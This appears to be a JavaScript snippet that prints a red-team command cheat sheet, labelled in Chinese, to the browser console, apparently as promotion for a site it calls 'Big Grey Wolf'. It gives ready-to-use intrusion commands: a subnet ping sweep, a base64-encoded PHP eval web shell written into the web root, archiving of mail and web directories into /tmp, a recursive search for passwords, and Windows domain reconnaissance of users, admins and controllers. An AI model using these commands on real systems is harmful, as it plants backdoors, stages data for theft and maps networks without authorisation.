...
console.log(
  '%c\n红队命令%c 内网存活探测 %c\n for /l %z in (1,1,255) do @ ping 192.168.0.%z -w 1 -n 1 | find /i "ttl=" %c\n for i in $(seq 1 255); do ping -c 1 -W 1 192.168.0.$i | grep "ttl="; done',
  "color:rgb(255, 87, 51);padding:4px 0;",
  "color:#337DFE;padding:5px 0;",
  "color:#444;background:#E0FECE;padding:4px 0;",
  "color:#444;background:#E0FECE;padding:4px 0;"
);
console.log(
  "%c\n红队命令%c linux下base64写马 %c\n echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php",
  "color:rgb(255, 87, 51);padding:4px 0;",
  "color:#38f;padding:5px 0;",
  "color:#444;background:#cefcfe ;padding:4px 0;"
);
console.log(
  "%c\n红队命令%c 打包目录 %c\n powershell -Command 'Compress-Archive -Path C:/test -DestinationPath C:/test.zip' %c\n //zip打包两个目录 zip -r /tmp/web.zip /home/mail /home/web %c\n //tar打包两个目录 tar czvf /tmp/web.tar.gz /home/mail /home/web",
  "color:rgb(255, 87, 51);padding:4px 0;",
  "color:#38f;padding:5px 0;",
  "color:#444;background:#CECEFE;padding:4px 0;",
  "color:#444;background:#CECEFE;padding:4px 0;",
  "color:#444;background:#CECEFE;padding:4px 0;"
);
console.log(
  "%c\n 红队命令%c 搜索字符串显示行号 %c\n grep -rn 'password' ./www ",
  "color:rgb(255, 87, 51);padding:4px 0;",
  "color:#38f;padding:5px 0;",
  "color:#444;background:#FECEEF;padding:4px 0;"
);
console.log(
  "%c\n 域渗透%c 用户信息 %c\n //查看域内用户 net user /domain %c\n //查看域管 net group 'domain admins' /domain %c\n //时间服务器|DNS一般都是DC net time /domain %c\n //查询dns nslookup -type=all _ldap._tcp.dc._msdcs.xxcom.local %c\n //查看域控 net group 'domain controllers' /domain %c\n //查看在线用户 query user || qwinsta %c\n //查询域密码策略 net accounts /domain",
  "color:rgb(255, 87, 51);padding:4px 0;",
  "color:#38f;padding:5px 0;",
  "color:#444;background:#FEEACE;padding:4px 0;",
  "color:#444;background:#FEEACE;padding:4px 0;",
  "color:#444;background:#FEEACE;padding:4px 0;",
  "color:#444;background:#FEEACE;padding:4px 0;",
  "color:#444;background:#FEEACE;padding:4px 0;",
...
console.log(
  "%c\n 域渗透%c 主机发现 %c\n //获取域控制器ip dsquery server and ping hostname %c\n //查看共享资料 net view %c\n //查看arp表 arp -a %c\n //查看dns缓存 ipconfig /displaydns %c\n //查看hosts文件 type c:/Windows/system32/drivers/etc/hosts %c\n //查询当前登陆域 net config workstation",
  "color:rgb(255, 87, 51);padding:4px 0;",
  "color:#38f;padding:5px 0;",
  "color:#444;background:#A9CCE3;padding:4px 0;",
  "color:#444;background:#A9CCE3;padding:4px 0;",
  "color:#444;background:#A9CCE3;padding:4px 0;",
  "color:#444;background:#A9CCE3;padding:4px 0;",
  "color:#444;background:#A9CCE3;padding:4px 0;",
...
console.log(
  "%c\n关注大灰狼永久域名！",
  "color:rgb(6,6,6);background:#F7DC6F;padding:4px 0;"
);
